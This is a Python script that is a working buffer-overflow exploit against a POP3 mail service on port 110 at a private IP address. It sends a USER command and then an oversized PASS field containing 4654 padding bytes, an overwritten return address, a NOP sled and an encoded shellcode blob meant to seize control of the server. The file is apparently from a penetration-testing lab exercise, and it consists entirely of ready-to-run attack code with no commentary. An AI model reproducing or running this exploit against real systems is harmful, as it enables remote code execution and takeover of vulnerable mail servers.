#!/usr/bin/python3 

import sys, socket, signal  
from struct import pack 

def ctrl_c(sig, frame):
    print("\n\n[!] Quiting...\n\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

ip_address = "192.168.1.34"
port = 110 
offset = 4654
eip = pack("<L", 0x5f4b9703)
nops = b"\x90"*16
shellcode = (b"\xda\xc9\xbb\x5f\x88\x8f\xaa\xd9\x74\x24\xf4\x58\x29\xc9"
b"\xb1\x45\x31\x58\x1a\x03\x58\x1a\x83\xe8\xfc\xe2\xaa\x74"
b"\x67\x28\x54\x85\x78\x4d\xdd\x60\x49\x4d\xb9\xe1\xfa\x7d"
b"\xca\xa4\xf6\xf6\x9e\x5c\x8c\x7b\x36\x52\x25\x31\x60\x5d"
b"\xb6\x6a\x50\xfc\x34\x71\x84\xde\x05\xba\xd9\x1f\x41\xa7"
b"\x13\x4d\x1a\xa3\x81\x62\x2f\xf9\x19\x08\x63\xef\x19\xed"
b"\x34\x0e\x08\xa0\x4f\x49\x8a\x42\x83\xe1\x83\x5c\xc0\xcc"
b"\x5a\xd6\x32\xba\x5d\x3e\x0b\x43\xf1\x7f\xa3\xb6\x08\x47"
b"\x04\x29\x7f\xb1\x76\xd4\x87\x06\x04\x02\x02\x9d\xae\xc1"
b"\xb4\x79\x4e\x05\x22\x09\x5c\xe2\x21\x55\x41\xf5\xe6\xed"
b"\x7d\x7e\x09\x22\xf4\xc4\x2d\xe6\x5c\x9e\x4c\xbf\x38\x71"
b"\x71\xdf\xe2\x2e\xd7\xab\x0f\x3a\x6a\xf6\x45\xbd\xf9\x8c"
b"\x28\xbd\x01\x8f\x1c\xd6\x30\x04\xf3\xa1\xcd\xcf\xb7\x4e"
b"\x2c\xda\xcd\xe6\xe8\x8f\x6f\x6b\x0b\x7a\xb3\x92\x8f\x8f"
b"\x4c\x61\x8f\xe5\x49\x2d\x08\x15\x20\x3e\xfc\x19\x97\x3f"
b"\xd5\x6a\x78\xb7\xb0\xf8\xf5\x5f\x5f\x91\x95\xbf\xd6\x2c"
b"\x3e\xe8\xa6\xcb\xc9\xc5\x79\x76\x5c\x73\xe6\x02\x80\x35"
b"\x8d\x9e\xee\x9e\x28\x3d\xac\x4c\xdb\xa4\x5c\xf9\x32\x09"
b"\xc5\x6e\x33\x3b\x69\x1e\xda\xa7\x22\x94\x6e\x41\xab\x33"
b"\xa6\xb6\x5b\xc8\xc2\xc8\xa1\x1f\x05\x18\xef\x6d\x77\x6b"
b"\x39\xaa\xa9\xba\x6b\xf9\x86\x93\x01\x98\x9e\x8e\x97\x11"
b"\x3b\x7f\x28\xa5\xf2\x58\xe1\x49")

payload = b'A'*offset + eip + nops + shellcode 

def bof():
    connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection.connect((ip_address, port))
    successfully_connection = connection.recv(1024)

    if successfully_connection: 
        print("\n\n\t[!] Connected to IP address {} port {}\n\n".format(ip_address, port))
        connection.send(b"USER dobliuw" + b"\r\n")
        response = connection.recv(1024)
        print(response)

        connection.send(b'PASS ' + payload + b"\r\n")
        response = connection.recv(1024)
        print(response)
        connection.close()


if __name__ == "__main__": 
    bof()
